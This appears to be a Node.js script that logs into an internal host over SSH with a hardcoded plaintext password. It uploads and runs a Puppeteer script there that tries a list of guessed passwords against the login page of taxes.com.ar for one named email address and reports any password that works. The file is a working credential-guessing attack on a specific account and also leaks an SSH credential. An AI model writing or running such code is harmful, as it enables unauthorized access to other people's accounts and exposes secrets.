const { Client } = require('ssh2');

const TEST_SCRIPT = `
const puppeteer = require('puppeteer-core');

(async () => {
  try {
    const browser = await puppeteer.launch({
      executablePath: '/usr/bin/chromium',
      headless: 'new',
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();
    console.log("Navigating to https://taxes.com.ar...");
    await page.goto('https://taxes.com.ar', { waitUntil: 'networkidle2', timeout: 30000 });
    console.log("URL:", page.url());
    console.log("Title:", await page.title());

    const passwordsToTest = ['Paniol2015', 'paniol2015', 'Paniol2024', 'Paniol2025', 'Paniol2026', '123456', 'Paniol123'];

    for (const pass of passwordsToTest) {
      console.log('Testing password:', pass);
      await page.goto('https://taxes.com.ar', { waitUntil: 'networkidle2', timeout: 30000 });

      const userInputs = await page.$$('input[type="text"], input[name="username"], input[name="user"], input[name="email"]');
      if (userInputs.length > 0) {
        await userInputs[0].type('paniol@contenedoreshugo.com.ar');
      }
      const passInputs = await page.$$('input[type="password"]');
      if (passInputs.length > 0) {
        await passInputs[0].type(pass);
      }

      await Promise.all([
        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
        page.click('button[type="submit"], input[type="submit"]')
      ]);

      const currentUrl = page.url();
      const content = await page.content();
      console.log('Result for ' + pass + ': URL = ' + currentUrl);
      if (!content.toLowerCase().includes('incorrect') && !content.toLowerCase().includes('error') && !currentUrl.includes('login')) {
        console.log('🎉 SUCCESSFUL LOGIN WITH PASSWORD: ' + pass);
        break;
      }
    }
    await browser.close();
  } catch(e) {
    console.error("DEBUG ERROR:", e.stack);
  }
})();
`;

const conn = new Client();
conn.on('ready', () => {
  conn.sftp((err, sftp) => {
    if (err) return conn.end();
    sftp.writeFile('/tmp/test_debug_core.js', TEST_SCRIPT, (err2) => {
      if (err2) return conn.end();
      conn.exec("cd /home/cbelocures/gestion && node /tmp/test_debug_core.js 2>&1", (err3, stream) => {
        let out = '';
        stream.on('data', d => out += d);
        stream.on('close', () => {
          console.log("=== TAXES LOGIN TEST RESULT ===");
          console.log(out);
          conn.end();
        });
      });
    });
  });
}).connect({
  host: '192.168.50.4',
  port: 22,
  username: 'cbelocures',
  password: 'CesarHernan3550'
});
